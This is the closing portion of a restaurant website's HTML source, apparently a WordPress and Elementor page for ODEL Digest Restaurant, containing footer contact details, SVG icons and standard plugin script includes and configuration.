				<svg xmlns="http://www.w3.org/2000/svg" width="27" height="18" viewBox="0 0 27 18" fill="none"><path d="M13.7137 4.62016C13.5537 4.64016 13.3937 4.70016 13.2337 4.80016C13.0737 4.90016 12.9487 5.04016 12.8587 5.22016C12.7687 5.40016 12.7137 5.56016 12.6937 5.70016C12.6537 5.94016 12.6437 6.14016 12.6637 6.30016C12.7037 6.56016 12.7887 6.74016 12.9187 6.84016C13.0487 6.94016 13.1937 6.98016 13.3537 6.96016L13.6537 6.93016C13.7137 6.93016 13.8037 6.89016 13.9237 6.81016L14.1037 4.62016H13.7137ZM0.18375 2.76016C1.10375 3.68016 2.49375 5.07016 4.35375 6.93016C8.05375 10.6102 10.8237 13.3802 12.6637 15.2402C12.8437 15.4202 12.9887 15.5052 13.0987 15.4952C13.2087 15.4852 13.3537 15.4002 13.5337 15.2402L25.3237 3.42016L25.5637 3.21016C25.8837 2.95016 26.0787 2.73516 26.1487 2.56516C26.2187 2.39516 26.2437 2.11016 26.2237 1.71016L26.1937 1.32016C26.2137 0.500156 25.8037 0.0901566 24.9637 0.0901566H1.20375C0.40375 0.0901566 0.00375 0.490156 0.00375 1.29016V2.28016C-0.01625 2.42016 0.04375 2.58016 0.18375 2.76016ZM9.72375 5.19016C9.86375 4.67016 10.1037 4.16016 10.4437 3.66016C10.8037 3.20016 11.2637 2.81016 11.8237 2.49016C12.4237 2.15016 13.1237 1.94016 13.9237 1.86016C14.3237 1.84016 14.7387 1.86516 15.1687 1.93516C15.5987 2.00516 15.9587 2.14016 16.2487 2.34016C16.5387 2.54016 16.8037 2.83016 17.0437 3.21016C17.2437 3.55016 17.3737 3.98016 17.4337 4.50016C17.4537 4.82016 17.4337 5.18016 17.3737 5.58016C17.2937 5.92016 17.1537 6.25016 16.9537 6.57016C16.7937 6.85016 16.5687 7.09516 16.2787 7.30516C15.9887 7.51516 15.6387 7.64516 15.2287 7.69516C14.8187 7.74516 14.4937 7.66016 14.2537 7.44016C14.1537 7.52016 13.9837 7.62016 13.7437 7.74016C13.5837 7.80016 13.3437 7.85016 13.0237 7.89016C12.8237 7.93016 12.6437 7.92516 12.4837 7.87516C12.3237 7.82516 12.1737 7.75016 12.0337 7.65016C11.8737 7.49016 11.7637 7.35016 11.7037 7.23016C11.6237 7.05016 11.5637 6.84016 11.5237 6.60016C11.4837 6.20016 11.5187 5.83016 11.6287 5.49016C11.7387 5.15016 11.8937 4.85016 12.0937 4.59016C12.2537 4.39016 12.4937 4.18016 12.8137 3.96016C13.0937 3.82016 13.4037 3.72016 13.7437 3.66016H14.0137C14.2537 3.64016 14.4237 3.64016 14.5237 3.66016C14.7237 3.66016 14.9637 3.70016 15.2437 3.78016L14.9737 6.78016C15.0137 6.80016 15.1137 6.81016 15.2737 6.81016C15.4937 6.77016 15.6837 6.68016 15.8437 6.54016C16.0037 6.40016 16.1237 6.23016 16.2037 6.03016C16.2837 5.83016 16.3487 5.60516 16.3987 5.35516C16.4487 5.10516 16.4537 4.85016 16.4137 4.59016C16.3537 3.95016 16.1037 3.46016 15.6637 3.12016C15.2237 2.82016 14.6337 2.70016 13.8937 2.76016C13.3737 2.82016 12.8737 2.96016 12.3937 3.18016C11.9937 3.40016 11.6537 3.70016 11.3737 4.08016C11.0937 4.46016 10.8937 4.86016 10.7737 5.28016C10.6537 5.70016 10.6137 6.15016 10.6537 6.63016C10.6737 6.97016 10.7737 7.31016 10.9537 7.65016C11.1337 7.99016 11.3237 8.22016 11.5237 8.34016C11.7637 8.52016 12.0237 8.64016 12.3037 8.70016C12.5837 8.76016 12.8937 8.77016 13.2337 8.73016C13.6337 8.69016 13.9137 8.65016 14.0737 8.61016C14.3337 8.55016 14.5637 8.46016 14.7637 8.34016L15.0037 8.85016C15.0437 8.97016 15.0737 9.06016 15.0937 9.12016C15.0137 9.18016 14.8937 9.24016 14.7337 9.30016C14.5337 9.38016 14.3787 9.43516 14.2687 9.46516C14.1587 9.49516 13.9837 9.53016 13.7437 9.57016C13.5037 9.61016 13.3237 9.63016 13.2037 9.63016C12.7637 9.69016 12.3337 9.67016 11.9137 9.57016C11.4937 9.47016 11.1187 9.30516 10.7887 9.07516C10.4587 8.84516 10.1937 8.54016 9.99375 8.16016C9.75375 7.72016 9.62375 7.25016 9.60375 6.75016C9.54375 6.31016 9.58375 5.79016 9.72375 5.19016ZM20.2837 10.7702C20.2637 10.7502 20.2337 10.7202 20.1937 10.6802L20.0137 10.5302C19.9337 10.6502 19.8737 10.7302 19.8337 10.7702L14.4337 16.1702C14.0137 16.5902 13.5687 16.8002 13.0987 16.8002C12.6287 16.8002 12.1937 16.6002 11.7937 16.2002L6.39375 10.8002C6.33375 10.7402 6.26375 10.6502 6.18375 10.5302C6.12375 10.5702 6.07375 10.6102 6.03375 10.6502L0.15375 16.5302C0.01375 16.6702 -0.02625 16.8602 0.03375 17.1002C0.15375 17.6402 0.53375 17.9102 1.17375 17.9102H25.2337C25.6537 17.8502 25.9437 17.6502 26.1037 17.3102C26.1837 17.1102 26.2187 16.9502 26.2087 16.8302C26.1987 16.7102 26.1137 16.5702 25.9537 16.4102C24.6937 15.1702 22.8037 13.2902 20.2837 10.7702ZM0.00375 14.7602L5.10375 9.66016C3.98375 8.50016 2.28375 6.78016 0.00375 4.50016V14.7602ZM26.1937 14.7302V4.50016L21.0937 9.60016L26.1937 14.7302Z" fill="white"></path></svg>				</span>
			</div>
			
						<div class="elementor-icon-box-content">

									<h3 class="elementor-icon-box-title">
						<span  >
							restaurant@odel.co.in						</span>
					</h3>
				
				
			</div>
			
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-3004123 elementor-position-left elementor-vertical-align-middle elementor-view-default elementor-mobile-position-top elementor-widget elementor-widget-icon-box" data-id="3004123" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">

						<div class="elementor-icon-box-icon">
				<span  class="elementor-icon elementor-animation-">
				<svg xmlns="http://www.w3.org/2000/svg" width="21" height="30" viewBox="0 0 21 30" fill="none"><path d="M15.4108 29.9698C14.8708 29.9898 14.2308 29.7998 13.4908 29.3998C12.8908 29.0598 12.2808 28.6298 11.6608 28.1098C10.4208 27.0498 9.24077 25.7298 8.12077 24.1498C7.30077 22.9898 6.38077 21.4798 5.36077 19.6198C4.22077 17.5998 3.29077 15.7898 2.57077 14.1898C1.65077 12.1898 0.950769 10.2798 0.470769 8.45976C0.230769 7.47976 0.0807692 6.62976 0.0207692 5.90976C-0.0392308 4.98976 0.0307692 4.13976 0.230769 3.35976C0.610769 1.93976 1.45077 1.10976 2.75077 0.869764C3.25077 0.789764 4.01077 0.639765 5.03077 0.419764C5.79077 0.239763 6.36077 0.119764 6.74077 0.059763C7.18077 -0.020237 7.53577 0.00976372 7.80577 0.149763C8.07577 0.289764 8.29077 0.559763 8.45077 0.959764C9.43077 3.31976 10.2708 5.40976 10.9708 7.22976C11.1308 7.64976 11.1658 8.00476 11.0758 8.29476C10.9858 8.58476 10.7608 8.84976 10.4008 9.08976L9.74077 9.53976C9.14077 9.91976 8.70077 10.2198 8.42077 10.4398C8.30077 10.5398 8.20077 10.6748 8.12077 10.8448C8.04077 11.0148 8.01077 11.1598 8.03077 11.2798C8.71077 13.9998 9.99077 16.4498 11.8708 18.6298C12.1508 18.9698 12.4808 19.0398 12.8608 18.8398C13.1808 18.6798 13.6808 18.4698 14.3608 18.2098L14.9908 17.9398C15.4308 17.7798 15.8008 17.7398 16.1008 17.8198C16.4008 17.8998 16.6808 18.1298 16.9408 18.5098C18.5808 20.9498 19.8008 22.7798 20.6008 23.9998C20.8808 24.4398 21.0008 24.8198 20.9608 25.1398C20.9208 25.4598 20.7108 25.8098 20.3308 26.1898L20.0308 26.4898C19.5708 26.9298 19.1308 27.3198 18.7108 27.6598C18.0308 28.1798 16.9308 28.9498 15.4108 29.9698Z" fill="white"></path></svg>				</span>
			</div>
			
						<div class="elementor-icon-box-content">

									<h3 class="elementor-icon-box-title">
						<span  >
							+91 9095888399						</span>
					</h3>
				
				
			</div>
			
		</div>
				</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-07eae5c elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="07eae5c" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-f1f2310" data-id="f1f2310" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-16d23b0 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="16d23b0" data-element_type="widget" data-widget_type="divider.default">
				<div class="elementor-widget-container">
					<div class="elementor-divider">
			<span class="elementor-divider-separator">
						</span>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-6c63084 elementor-widget elementor-widget-heading" data-id="6c63084" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">© Copyright Odel Digest. 2023 All Right Reserved.</h2>		</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				</div>
		</div>		</footer>
	</div><!-- #page -->
			<script type='text/javascript'>
				const lazyloadRunObserver = () => {
					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
					const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => {
						entries.forEach( ( entry ) => {
							if ( entry.isIntersecting ) {
								let lazyloadBackground = entry.target;
								if( lazyloadBackground ) {
									lazyloadBackground.classList.add( 'e-lazyloaded' );
								}
								lazyloadBackgroundObserver.unobserve( entry.target );
							}
						});
					}, { rootMargin: '200px 0px 200px 0px' } );
					lazyloadBackgrounds.forEach( ( lazyloadBackground ) => {
						lazyloadBackgroundObserver.observe( lazyloadBackground );
					} );
				};
				const events = [
					'DOMContentLoaded',
					'elementor/lazyload/observe',
				];
				events.forEach( ( event ) => {
					document.addEventListener( event, lazyloadRunObserver );
				} );
			</script>
			<script src="https://odel.co.in/wp-includes/js/dist/hooks.min.js?ver=2810c76e705dd1a53b18" id="wp-hooks-js"></script>
<script src="https://odel.co.in/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6" id="wp-i18n-js"></script>
<script id="wp-i18n-js-after">
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
</script>
<script src="https://odel.co.in/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=5.9.8" id="swv-js"></script>
<script id="contact-form-7-js-extra">
var wpcf7 = {"api":{"root":"https:\/\/odel.co.in\/index.php\/wp-json\/","namespace":"contact-form-7\/v1"},"cached":"1"};
</script>
<script src="https://odel.co.in/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.9.8" id="contact-form-7-js"></script>
<script src="https://odel.co.in/wp-content/themes/hello-elementor/assets/js/hello-frontend.min.js?ver=3.1.1" id="hello-theme-frontend-js"></script>
<script src="https://odel.co.in/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script src="https://odel.co.in/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script src="https://odel.co.in/wp-content/plugins/header-footer-elementor/inc/js/frontend.js?ver=1.6.40" id="hfe-frontend-js-js"></script>
<script src="https://odel.co.in/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.23.4" id="elementor-webpack-runtime-js"></script>
<script src="https://odel.co.in/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.23.4" id="elementor-frontend-modules-js"></script>
<script src="https://odel.co.in/wp-content/plugins/elementor/assets/lib/waypoints/waypoints.min.js?ver=4.0.2" id="elementor-waypoints-js"></script>
<script src="https://odel.co.in/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
<script id="elementor-frontend-js-before">
var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselWrapperAriaLabel":"Carousel | Horizontal scrolling: Arrow Left & Right","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}},"version":"3.23.4","is_static":false,"experimentalFeatures":{"e_optimized_css_loading":true,"additional_custom_breakpoints":true,"e_nested_atomic_repeaters":true,"e_onboarding":true,"hello-theme-header-footer":true,"home_screen":true,"ai-layout":true,"landing-pages":true,"e_lazyload":true},"urls":{"assets":"https:\/\/odel.co.in\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/odel.co.in\/wp-admin\/admin-ajax.php"},"nonces":{"floatingButtonsClickTracking":"3e82ecc625"},"swiperClass":"swiper-container","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","hello_header_logo_type":"logo","hello_header_menu_layout":"horizontal","hello_footer_logo_type":"logo"},"post":{"id":4518,"title":"ODEL%20Digest%20Restaurant","excerpt":"","featuredImage":false}};
</script>
<script src="https://odel.co.in/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.23.4" id="elementor-frontend-js"></script>
</body>
</html> 


<!-- Page cached by LiteSpeed Cache 7.6.2 on 2026-05-23 16:53:06 -->
